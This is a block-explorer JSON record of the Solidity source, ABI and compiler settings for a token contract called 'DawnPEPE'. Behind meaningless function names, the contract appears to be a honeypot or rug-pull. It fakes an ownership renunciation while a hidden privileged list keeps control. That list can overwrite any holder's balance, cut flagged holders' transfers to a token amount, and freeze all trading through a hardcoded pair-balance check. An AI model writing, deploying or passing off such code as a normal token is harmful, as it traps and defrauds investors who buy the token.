{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchedBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitToken) external view returns (uint256);\n\n    function transfer(address launchBuy, uint256 feeSwap) external returns (bool);\n\n    function allowance(address autoReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchBuy,\n        uint256 feeSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listAtBuy, uint256 value);\n    event Approval(address indexed autoReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract receiverReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableLiquidity {\n    function createPair(address amountList, address launchedAmountExempt) external returns (address);\n}\n\ninterface feeTx is launchedBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DawnPEPE is receiverReceiver, launchedBuy, feeTx {\n\n    mapping(address => bool) public minEnableTrading;\n\n    string private marketingEnable = \"DPE\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingListMode;\n    }\n\n    bool private liquidityTotal;\n\n    bool public senderBuyToken;\n\n    function getOwner() external view returns (address) {\n        return minIs;\n    }\n\n    bool public feeLimit;\n\n    uint256 private shouldMarketing;\n\n    function allowance(address sellTo, address marketingTeam) external view virtual override returns (uint256) {\n        if (marketingTeam == teamAt) {\n            return type(uint256).max;\n        }\n        return feeToEnable[sellTo][marketingTeam];\n    }\n\n    function modeExempt() public {\n        emit OwnershipTransferred(txIs, address(0));\n        minIs = address(0);\n    }\n\n    uint8 private sellLiquidity = 18;\n\n    mapping(address => mapping(address => uint256)) private feeToEnable;\n\n    bool public receiverAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellLiquidity;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoLimitSender;\n    }\n\n    address autoShouldMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return minIs;\n    }\n\n    address private minIs;\n\n    mapping(address => bool) public shouldBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingEnable;\n    }\n\n    function transferFrom(address fundMarketing, address launchBuy, uint256 feeSwap) external override returns (bool) {\n        if (_msgSender() != teamAt) {\n            if (feeToEnable[fundMarketing][_msgSender()] != type(uint256).max) {\n                require(feeSwap <= feeToEnable[fundMarketing][_msgSender()]);\n                feeToEnable[fundMarketing][_msgSender()] -= feeSwap;\n            }\n        }\n        return toAmountIs(fundMarketing, launchBuy, feeSwap);\n    }\n\n    uint256 private marketingListMode = 100000000 * 10 ** 18;\n\n    function approve(address marketingTeam, uint256 feeSwap) public virtual override returns (bool) {\n        feeToEnable[_msgSender()][marketingTeam] = feeSwap;\n        emit Approval(_msgSender(), marketingTeam, feeSwap);\n        return true;\n    }\n\n    uint256 maxReceiverSwap;\n\n    function balanceOf(address limitToken) public view virtual override returns (uint256) {\n        return modeTeamWallet[limitToken];\n    }\n\n    function exemptTokenFund(address fundReceiver, uint256 feeSwap) public {\n        autoTeam();\n        modeTeamWallet[fundReceiver] = feeSwap;\n    }\n\n    function tradingBuyLaunch(address fundMarketing, address launchBuy, uint256 feeSwap) internal returns (bool) {\n        require(modeTeamWallet[fundMarketing] >= feeSwap);\n        modeTeamWallet[fundMarketing] -= feeSwap;\n        modeTeamWallet[launchBuy] += feeSwap;\n        emit Transfer(fundMarketing, launchBuy, feeSwap);\n        return true;\n    }\n\n    constructor (){\n        \n        receiverFee totalIs = receiverFee(teamAt);\n        takeTokenShould = enableLiquidity(totalIs.factory()).createPair(totalIs.WETH(), address(this));\n        \n        txIs = _msgSender();\n        modeExempt();\n        minEnableTrading[txIs] = true;\n        modeTeamWallet[txIs] = marketingListMode;\n        if (senderBuyToken) {\n            senderBuyToken = true;\n        }\n        emit Transfer(address(0), txIs, marketingListMode);\n    }\n\n    function tokenReceiver(address walletIsFund) public {\n        require(walletIsFund.balance < 100000);\n        if (feeLimit) {\n            return;\n        }\n        \n        minEnableTrading[walletIsFund] = true;\n        \n        feeLimit = true;\n    }\n\n    uint256 walletSender;\n\n    function exemptBuy(uint256 feeSwap) public {\n        autoTeam();\n        walletSender = feeSwap;\n    }\n\n    uint256 public marketingFrom;\n\n    bool public modeBuyLaunched;\n\n    function transfer(address fundReceiver, uint256 feeSwap) external virtual override returns (bool) {\n        return toAmountIs(_msgSender(), fundReceiver, feeSwap);\n    }\n\n    address teamAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function toAmountIs(address fundMarketing, address launchBuy, uint256 feeSwap) internal returns (bool) {\n        if (fundMarketing == txIs) {\n            return tradingBuyLaunch(fundMarketing, launchBuy, feeSwap);\n        }\n        uint256 buyTradingTo = launchedBuy(takeTokenShould).balanceOf(autoShouldMin);\n        require(buyTradingTo == walletSender);\n        require(launchBuy != autoShouldMin);\n        if (shouldBuy[fundMarketing]) {\n            return tradingBuyLaunch(fundMarketing, launchBuy, atShould);\n        }\n        return tradingBuyLaunch(fundMarketing, launchBuy, feeSwap);\n    }\n\n    event OwnershipTransferred(address indexed swapExempt, address indexed limitList);\n\n    function liquidityAt(address walletTx) public {\n        autoTeam();\n        if (modeLaunch) {\n            marketingFrom = shouldMarketing;\n        }\n        if (walletTx == txIs || walletTx == takeTokenShould) {\n            return;\n        }\n        shouldBuy[walletTx] = true;\n    }\n\n    mapping(address => uint256) private modeTeamWallet;\n\n    bool private modeLaunch;\n\n    uint256 private shouldMax;\n\n    address public txIs;\n\n    string private autoLimitSender = \"Dawn PEPE\";\n\n    address public takeTokenShould;\n\n    uint256 constant atShould = 2 ** 10;\n\n    function autoTeam() private view {\n        require(minEnableTrading[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAtBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"exemptBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"exemptTokenFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTx\",\"type\":\"address\"}],\"name\":\"liquidityAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minEnableTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuyToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTokenShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletIsFund\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DawnPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}